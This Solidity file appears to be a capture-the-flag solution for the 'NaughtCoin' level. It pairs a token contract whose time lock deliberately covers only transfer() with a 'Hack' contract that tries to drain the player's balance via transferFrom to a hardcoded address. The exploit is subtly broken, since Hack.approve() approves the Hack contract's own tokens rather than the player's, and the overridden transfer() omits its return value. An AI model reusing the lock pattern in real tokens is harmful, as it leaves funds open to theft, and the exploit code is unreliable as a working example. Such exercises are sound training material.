// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) public ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value)
        public
        override
        lockTokens
        returns (bool)
    {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract Hack {
    NaughtCoin naughtcoin;

    constructor(address _instanceAddr) {
        naughtcoin = NaughtCoin(_instanceAddr);
    }

    function approve() public {
        naughtcoin.approve(address(this), 1000000 * 10**18);
    }

    function transfer(address _instanceAddr) external {
        naughtcoin.transferFrom(
            0xB91621B0106C542Faf1cFeB4c316FEc48096B129,
            0x08Df612dDDbb66bfd5FAD48FEB225763065cD2D6,
            1000000 * 10**18
        );
    }
}
